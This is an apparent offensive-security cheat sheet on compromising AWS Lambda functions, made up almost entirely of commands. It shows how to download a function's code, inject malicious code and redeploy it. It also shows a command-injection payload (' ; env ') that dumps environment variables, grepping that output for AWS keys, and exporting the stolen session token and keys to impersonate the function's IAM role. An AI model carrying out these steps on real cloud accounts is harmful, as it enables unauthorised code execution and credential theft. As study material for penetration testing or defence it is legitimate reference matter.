# Code Injection

## Upload malicious code

Download lambda source code, unzip the archive alter the source code and create a new archive containing the malicious code

```
wget $(aws lambda get-function --function-name "<function>" --query Code.Location --output text) -O "./source.zip"
mkdir dump
unzip "source.zip" -d ./dump
cd dump
<edit the source code>
zip -r ../compromised.zip ./*
```

Upload the source code

```
aws lambda update-function-code --region <region> --function-name <function> --zip-file fileb://compromised.zip
```

Run code

```
aws lambda invoke --function-name <function> output.json
```

Run with parameters. Use the payload switch and specify your parameters inside a json file stored on your local machine or in the home folder of AWS Cli session

```
aws lambda invoke --function-name <function> --payload fileb://<path>.json output.json
```

## RCE to IAM Role Compromise

Create a payload json file like follows

```
{
    "<vunerable param>": " ; env "
}
```

Invoke Lambda function with specified payload and store output in json file

```
 aws lambda invoke --function-name <function name> --payload fileb://payload.json output.json
```

Search for credentials in output

```
cat output.json | jq -r . | grep AWS
```

Configure local account to impersonate role

```
export AWS_SESSION_TOKEN=<session token>
export AWS_SECRET_ACCESS_KEY=<access key value>
export AWS_ACCESS_KEY_ID=<access key name>
```

